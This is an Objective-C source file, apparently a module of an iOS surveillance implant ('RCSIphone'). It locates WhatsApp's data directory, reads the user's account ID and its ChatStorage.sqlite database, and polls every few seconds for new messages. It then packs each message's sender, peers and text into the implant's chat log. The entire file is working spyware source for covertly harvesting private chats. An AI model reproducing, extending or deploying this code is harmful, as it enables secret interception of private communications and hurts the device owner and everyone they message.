//
//  RCSIAgentChat.m
//  RCSIphone
//
//  Created by armored on 7/25/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "RCSIAgentChat.h"
#import "RCSILogManager.h"
#import "RCSIUtils.h"

#define USER_APPLICATIONS_PATH @"/private/var/mobile/Applications"
#define k_i_AgentChatRunLoopMode @"k_i_AgentChatRunLoopMode"
#define CHAT_TIMEOUT 3
#define LOG_DELIMITER 0xABADC0DE

@implementation _i_AgentChat

#pragma mark -
#pragma mark - Initialization 
#pragma mark -

- (id)init
{
    self = [super init];
    if (self)
    {
      mLastMsgPK = 0;
      mAgentID = AGENT_IM;
      mWADbPathName = nil;
      mWAUsername = nil;
    }
    
    return self;
}

#pragma mark -
#pragma mark Support methods
#pragma mark -

- (void)getProperties
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSString *chatClassKey = [[self class] description];
  
  NSDictionary *tmpDict = [[_i_Utils sharedInstance] getPropertyWithName: chatClassKey];
  
  if (tmpDict != nil)
  {
    NSNumber *tmplaskpk = [tmpDict objectForKey: @"lastpk"];
    
    if (tmplaskpk != nil)
    {
      mLastMsgPK = [tmplaskpk intValue];
    }
  }
  
  [pool release];
}

- (void)setProperties
{
  NSNumber *tmpLastPK = [NSNumber numberWithInt: mLastMsgPK];
  NSString *chatClassKey = [[self class] description];
  
  NSDictionary *tmpDict = [NSDictionary dictionaryWithObjectsAndKeys: tmpLastPK, @"lastpk", nil];
  NSDictionary *dict    = [NSDictionary dictionaryWithObjectsAndKeys: tmpDict, chatClassKey, nil];
  
  [[_i_Utils sharedInstance] setPropertyWithName: chatClassKey withDictionary: dict];
}

- (NSString*)getWARootPathName
{
  NSString *rootPath = nil;
  
  NSArray *usrAppFirstLevelPath =
    [[NSFileManager defaultManager] contentsOfDirectoryAtPath:USER_APPLICATIONS_PATH
                                                        error:nil];
  
  if (usrAppFirstLevelPath == nil || [self isThreadCancelled] == TRUE)
    return  rootPath;
  
  for (int i=0; i < [usrAppFirstLevelPath count]; i++)
  {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    if ([self isThreadCancelled] == TRUE)
    {
      [pool release];
      return  rootPath;
    }
    
    NSString *tmpPath = [NSString stringWithFormat:@"%@/%@/WhatsApp.app",
                         USER_APPLICATIONS_PATH,
                         [usrAppFirstLevelPath objectAtIndex:i]];
    
    if ([[NSFileManager defaultManager] fileExistsAtPath: tmpPath] == TRUE)
    {
      rootPath = [NSString stringWithFormat:@"%@/%@",
                                            USER_APPLICATIONS_PATH,
                                            [usrAppFirstLevelPath objectAtIndex:i]];
      
      if ([[NSFileManager defaultManager] fileExistsAtPath: rootPath] == FALSE)
      {
        [rootPath release];
        rootPath = nil;
      }
      else
      {
        [rootPath retain];
        [pool release];
        break;
      }
    }
    
    [pool release];
  }
  
  return rootPath;
}

- (void)setWAUserName
{
  if ([self isThreadCancelled] == TRUE || mWAUsername != nil)
    return;
  
  NSString *rootPath = [self getWARootPathName];
  
  if (rootPath != nil)
  {
    NSString *WAPrefsPath =
      [NSString stringWithFormat:@"%@/Library/Preferences/net.whatsapp.WhatsApp.plist",
                                 rootPath];
    [rootPath release];
    
    NSDictionary *prefs = [NSDictionary dictionaryWithContentsOfFile: WAPrefsPath];
    
    if (prefs != nil && [prefs objectForKey: @"OwnJabberID"] != nil)
    {
      mWAUsername = [[NSString alloc] initWithString: [prefs objectForKey: @"OwnJabberID"]];
    }
  }
}

- (BOOL)setWADbPathName
{
  BOOL bRet = FALSE;
     
  if ([self isThreadCancelled] == TRUE || mWADbPathName != nil)
    return  FALSE;
    
  NSString *rootPath = [self getWARootPathName];
    
  if (rootPath != nil)
  {
    mWADbPathName = [[NSString alloc] initWithFormat:@"%@/Documents/ChatStorage.sqlite",
                                                   rootPath];
    
    [rootPath release];
    
    if ([[NSFileManager defaultManager] fileExistsAtPath: mWADbPathName] == TRUE)
      bRet = TRUE;
    else
    {
      [mWADbPathName release];
      mWADbPathName = nil;
    }
  }

  return bRet;
}

#pragma mark -
#pragma mark SQLITE3 stuff
#pragma mark -

- (void)closeWAChatDB:(sqlite3*)db
{
  if (db != NULL)
    sqlite3_close(db);
}

- (sqlite3*)openWAChatDB
{
  sqlite3 *db = NULL;
  
  if ([self isThreadCancelled] == TRUE || mWADbPathName == nil)
  {
    [self setMAgentStatus:AGENT_STATUS_STOPPED];
    return db;
  }
  
  sqlite3_open([mWADbPathName UTF8String], &db) ;
  
  return db;
}

- (NSString*)getSqlLiteString:(sqlite3_stmt*)compiledStatement
                       colNum:(int)column
{
  NSString *sqlStr = nil;
  
  if (sqlite3_column_text(compiledStatement, column) != NULL)
  {
    sqlStr =[NSString stringWithUTF8String:(char *)sqlite3_column_text(compiledStatement, column)];
  }
  else
  {
    sqlStr = [NSString stringWithUTF8String:" "];
  }
  
  return  sqlStr;
}

- (NSString*)getSender:(sqlite3_stmt*)compiledStatement
{
  NSString *sqlString = nil;
  
  if (sqlite3_column_text(compiledStatement, 1) == NULL)
  {
    sqlString = mWAUsername;
  }
  else
  {
    sqlString = [self getSqlLiteString:compiledStatement colNum:1];
  }
  
  return sqlString;
}

- (NSString*)getPeer:(sqlite3_stmt*)compiledStatement
{
  NSString *sqlString = nil;
  
  const unsigned char *tmpPeer = sqlite3_column_text(compiledStatement, 2);
  
  if ( tmpPeer == NULL)
  {
    sqlString = mWAUsername;
  }
  else
  {
    sqlString = [self getSqlLiteString:compiledStatement colNum:2];
    if (sqlString == nil)
      sqlString = @" ";
  }
  
  return sqlString;
}

- (NSMutableArray*)getWAChatMessagesFormDB:(sqlite3*)theDB
                                  withDate:(int)theDate
{
  NSMutableArray *retArray = [NSMutableArray arrayWithCapacity:0];
  
  char _wa_msg_query[] = "select ZTEXT, ZFROMJID, ZTOJID, Z_PK from ZWAMESSAGE where ZMESSAGEDATE >";
  char wa_msg_query[256];
  sprintf(wa_msg_query, "%s %d", _wa_msg_query, theDate);
  sqlite3_stmt *compiledStatement;
  
  if(sqlite3_prepare_v2(theDB, wa_msg_query, -1, &compiledStatement, NULL) == SQLITE_OK)
  {
    while(sqlite3_step(compiledStatement) == SQLITE_ROW)
    {
      int z_pk = sqlite3_column_int(compiledStatement, 3);
      
      if (z_pk > mLastMsgPK)
      {
        mLastMsgPK = z_pk;
        NSString *text = [self getSqlLiteString:compiledStatement colNum:0];
        NSString *peer = [self getPeer:compiledStatement];
        NSString *sndr = [self getSender:compiledStatement];
        
        NSDictionary *tmpDict = [NSDictionary dictionaryWithObjectsAndKeys:text, @"text",
                                                                           peer, @"peers",
                                                                           sndr, @"sender", nil];
        
        [retArray addObject: tmpDict];
      }
    }
    
    sqlite3_finalize(compiledStatement);
  }
  
  return retArray;
}

#pragma mark -
#pragma mark Agent chat methods
#pragma mark -

- (NSMutableData*)createWAChatLog:(NSString*)_sender
                        withPeers:(NSString*)_peers
                          andText:(NSString*)_text
{
  NSData *processName         = [@"WhatsApp" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *topic               = [@"-" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];  
  NSData *peers               = [_peers dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *content             = [_text dataUsingEncoding: NSUTF16LittleEndianStringEncoding];

  NSMutableData *entryData    = [NSMutableData dataWithCapacity:0];
  
  short unicodeNullTerminator = 0x0000;
  
  time_t rawtime;
  struct tm *tmTemp;
  
  // Struct tm
  time (&rawtime);
  tmTemp = gmtime(&rawtime);
  
  tmTemp->tm_year += 1900;
  tmTemp->tm_mon  ++;
 
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  if (sizeof(long) == 4) // 32bit
  {
    [entryData appendBytes: (const void *)tmTemp
                    length: sizeof (struct tm) - 0x8];
  }
  else if (sizeof(long) == 8) // 64bit
  {
    [entryData appendBytes: (const void *)tmTemp
                    length: sizeof (struct tm) - 0x14];
  }
  
  // Process Name
  [entryData appendData: processName];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Topic
  [entryData appendData: topic];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Peers
  [entryData appendData: peers];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  // Content
  [entryData appendData: [_sender dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [entryData appendData: [@": " dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [entryData appendData: content];  
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  // Delimiter
  unsigned int del = LOG_DELIMITER;
  
  [entryData appendBytes: &del
                  length: sizeof(del)];
  
  return entryData;
}

- (void)writeWAChatLogs:(NSArray*)chatArray
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if ([chatArray count] == 0)
  {
    [pool release];
    return;
  }
  
  _i_LogManager *logManager = [_i_LogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOG_CHAT
                           agentHeader: nil
                             withLogID: 0];
  if (success == FALSE)
  {
    [pool release];
    return;
  }
  
  for (int i=0; i < [chatArray count]; i++)
  {
    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
    
    NSDictionary* tmpChat = [chatArray objectAtIndex:i];
    
    NSMutableData *tmpData = [self createWAChatLog:[tmpChat objectForKey:@"sender"]
                                         withPeers:[tmpChat objectForKey:@"peers"]
                                           andText:[tmpChat objectForKey:@"text"]];
    [logManager writeDataToLog: tmpData
                      forAgent: LOG_CHAT
                     withLogID: 0];
    
    [inner release];
  }
  
  [logManager closeActiveLog: LOG_CHAT
                   withLogID: 0];
  
  [self setProperties];
  
  [pool release];
}

- (NSMutableArray*)getWAChats
{
  sqlite3 *db;
  NSMutableArray *chatArray = nil;
  
  if ([self isThreadCancelled] == TRUE)
  {
    [self setMAgentStatus:AGENT_STATUS_STOPPED];
    return chatArray;
  }
  
  if ((db = [self openWAChatDB]) == NULL)
    return chatArray;
  
  chatArray = [self getWAChatMessagesFormDB: db withDate:0.0];
  
  [self closeWAChatDB: db];
  
  return chatArray;
}

- (void)getChat
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  NSMutableArray *waChats = nil;
  
  if ([self isThreadCancelled] == TRUE)
  {
    [self setMAgentStatus:AGENT_STATUS_STOPPED];
    return;
  }
    
  waChats = [self getWAChats];

  [self writeWAChatLogs: waChats];
  
  [pool release];
}

- (void)setChatPollingTimeOut:(NSTimeInterval)aTimeOut 
{    
  NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: aTimeOut 
                                                    target: self 
                                                  selector: @selector(getChat) 
                                                  userInfo: nil 
                                                   repeats: YES];
  
  [[NSRunLoop currentRunLoop] addTimer: timer forMode: k_i_AgentChatRunLoopMode];
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (void)startAgent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  if ([self isThreadCancelled] == TRUE || [self setWADbPathName] == FALSE)
  {
    [self setMAgentStatus:AGENT_STATUS_STOPPED];
    [outerPool release];
    return;
  }
  
  [self setWAUserName];
  
  [self getProperties];
  
  [self setChatPollingTimeOut:CHAT_TIMEOUT];
  
  while ([self mAgentStatus] == AGENT_STATUS_RUNNING)
  {
    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
    [[NSRunLoop currentRunLoop] runMode: k_i_AgentChatRunLoopMode 
                             beforeDate: [NSDate dateWithTimeIntervalSinceNow: 1.00]];
    
    [innerPool release];
  }
  
  [self setMAgentStatus:AGENT_STATUS_STOPPED];
  
  [outerPool release];
}

- (BOOL)stopAgent
{
  [self setMAgentStatus: AGENT_STATUS_STOPPING];
  return YES;
}

- (BOOL)resume
{
  return YES;
}
@end
